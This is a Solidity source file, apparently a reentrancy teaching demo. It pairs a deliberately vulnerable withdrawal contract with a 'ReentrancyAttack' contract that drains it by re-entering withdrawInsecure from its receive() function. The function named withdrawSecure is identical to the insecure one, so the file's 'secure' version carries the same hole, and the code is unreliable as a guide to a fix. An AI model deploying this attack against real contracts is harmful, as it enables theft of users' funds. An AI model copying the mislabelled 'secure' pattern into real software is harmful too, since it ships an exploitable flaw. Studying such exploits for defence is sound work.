//SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.0;

contract Withdrawing {
    mapping(address => uint) internal balances;
    bool internal locked = false;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdrawInsecure() public {
        uint _amount=balances[msg.sender]; //to send all total
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Failed to send");
        balances[msg.sender] = 0;
    }
    function withdrawSecure() public {
        uint _amount=balances[msg.sender]; //to send all total
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Failed to send");
        balances[msg.sender] = 0;
    }
    function withdrawFlag() public {
        require(!locked);
        locked = true;
        withdrawInsecure();
        locked = false;
    }
    function getBalanceOfMsgSender() view public returns(uint) { return balances[msg.sender]; }
}

contract ReentrancyAttack {
    Withdrawing internal w;
    constructor(address _w) { //provide the adderss of Withdrawing contract
        w = Withdrawing(_w);
    }
    receive() external payable {
        if (address(w).balance >= 1 ether) {
            w.withdrawInsecure();
        }
    }
    function withdrawAttack() external payable {
        require(msg.value >= 1 ether);
        w.deposit{value: 1 ether}();
        w.withdrawInsecure();
    }
    function getBalance() view public returns(uint) { return address(this).balance; }
}
